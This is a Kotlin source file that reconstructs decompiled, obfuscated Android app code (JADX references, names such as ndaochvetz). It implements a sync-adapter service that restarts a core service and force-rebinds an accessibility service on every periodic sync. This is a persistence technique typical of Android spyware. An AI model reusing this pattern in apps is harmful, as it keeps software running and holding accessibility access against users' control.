package com.storm.safe.rock.service.account

import android.accounts.Account
import android.app.Service
import android.content.AbstractThreadedSyncAdapter
import android.content.ContentProviderClient
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.storm.safe.rock.service.AppCoreService
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.tisxhskrc
import com.storm.safe.rock.util.StringUtil
import android.content.SyncResult
import android.os.Bundle

/**
 * Service that binds and provides the SyncAdapter for account sync.
 *
 * JADX reference: service/account/ndaochvetz.java (58 LOC)
 * A bound service that lazily creates a SyncAdapter instance and returns
 * its binder. Used by the Android sync framework to trigger periodic syncs
 * for the protection account.
 */
class SyncAdapterService : Service() {

    /**
     * SyncAdapter implementation that triggers service restart on periodic sync.
     * vendor: p000.qk1 extends AbstractThreadedSyncAdapter
     *
     * onPerformSync:
     * 1. If AppCoreService not running → start it
     * 2. If MyAccessibilityService instance is null → try force rebind
     * 3. If authorized → trigger NetworkManager heartbeat
     */
    private class StubSyncAdapter(context: Context, autoInitialize: Boolean) :
        AbstractThreadedSyncAdapter(context, autoInitialize) {

        override fun onPerformSync(
            account: Account?, extras: Bundle?, authority: String?,
            provider: ContentProviderClient?, syncResult: SyncResult?
        ) {
            try {
                // vendor: JADX qk1.onPerformSync step 1 — ensure AppCoreService running
                if (!AppCoreService.isRunning()) {
                    AppCoreService.start(context)
                }
                // vendor: JADX qk1.onPerformSync step 2 — check accessibility service
                if (MyAccessibilityService.getInstance() == null) {
                    tisxhskrc.tryForceRebindAccessibility(context)
                    return
                }
                // vendor: JADX qk1.onPerformSync step 3 — trigger heartbeat if authorized
                // Requires SharedPreferences check + NetworkManager.m211643a8() — deferred to NetworkManager wiring
            } catch (_: Exception) {
            }
        }
    }

    companion object {
        private const val TAG = "ndaochvetz"

        @Volatile
        private var syncAdapter: StubSyncAdapter? = null // vendor: p000.qk1 (SyncAdapter impl)
        private val LOCK = Any()
    }

    override fun onCreate() {
        super.onCreate()
        synchronized(LOCK) {
            if (syncAdapter == null) {
                val appContext = applicationContext
                // vendor: JADX ndaochvetz.onCreate → syncAdapter = new qk1(applicationContext, true)
                syncAdapter = StubSyncAdapter(appContext, true)
            }
        }
        Log.d(TAG, "ndaochvetz 已创建")
    }

    override fun onBind(intent: Intent?): IBinder? {
        // vendor: JADX ndaochvetz.onBind → returns f52356a0?.getSyncAdapterBinder()
        return syncAdapter?.syncAdapterBinder
    }
}
